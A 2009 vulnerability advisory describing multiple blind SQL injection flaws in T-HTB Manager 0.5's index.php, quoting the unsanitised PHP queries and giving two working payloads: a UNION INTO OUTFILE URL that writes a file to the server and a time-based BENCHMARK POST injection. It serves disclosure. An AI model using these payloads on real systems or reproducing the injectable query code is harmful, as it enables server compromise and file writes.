T-HTB Manager 0.5 Multiple Blind SQL Injection Vulnerabilities
==============================================================



********   Salvatore "drosophila" Fresta   ********

[+] Application: T-HTB Manager
[+] Version: 0.5
[+] Website: http://sourceforge.net/apps/mediawiki/t-htbmanager/index.php?title=Main_Page

[+] Bugs: [A] Multiple Blind SQL Injection

[+] Exploitation: Remote
[+] Date: 10 Sep 2009

[+] Discovered by: Salvatore Fresta aka drosophila
[+] Author: Salvatore Fresta aka drosophila


***************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


***************************************************

[+] Bugs


- [A] Multiple Blind SQL Injection

[-] Risk: medium
[-] Requisites: magic_quotes_gpc = off
[-] File affected: index.php

All fields in this script are not sanitized but any
outputs aren&#039;t returned.

...

	case &#039;delete_category&#039;:
      $id = $_GET[&#039;id&#039;];
      $id_interfaces = $_GET[&#039;id_interfaces&#039;];

      if($id>0)
      {
        $query =  "SELECT rgt, lft FROM ".$table_name." WHERE id=&#039;" . $id . "&#039;";
        $db_query = mysql_query($query);
        
...

    case &#039;update_category&#039;:
      $name = $_POST[&#039;name&#039;];
      $id = $_POST[&#039;id&#039;];

      $rate  	= $_POST[&#039;rate&#039;];
      $ceil  	= $_POST[&#039;ceil&#039;];
      $burst 	= $_POST[&#039;burst&#039;];
      $prio  	= $_POST[&#039;prio&#039;];
      $monitor  = $_POST[&#039;monitor&#039;];

      if(strlen($name)>0 && $id>0)
      {
        $nodelft = $_POST[&#039;nodelft&#039;];

        $lft = $_POST[&#039;lft&#039;];
        $rgt = $_POST[&#039;rgt&#039;];

        $query = "UPDATE ".$table_name." set name=&#039;" . $name . "&#039; ,  lft=&#039;" . $lft . "&#039; , rgt = &#039;" . $rgt . "&#039;, rate= &#039;" . $rate . "&#039;, ceil = &#039;" . $ceil . "&#039;, burst = &#039;" . $burst . "&#039;, prio = &#039;" . $prio . "&#039;, monitor = &#039;" . $monitor . "&#039; WHERE id=&#039;" . $id . "&#039;";
             
...

And many others..


***************************************************

[+] Code


- [A] Multiple Blind SQL Injection

This is a Blind SQL Injection bug but into the
database there aren&#039;t very reserved information
such as usernames and/or passwords. However this
injection can be used to write arbitrary files
on the server (when allowed).

http://site/path/index.php?action=delete_category&id=1&#039; UNION ALL SELECT NULL,&#039;evil code&#039; INTO OUTFILE &#039;/tmp/file.php

Send it as a POST packet:

action=update_category&id=9999&name=blabla&#039; WHERE 1=0 OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23


***************************************************

[+] Fix

No fix.


***************************************************



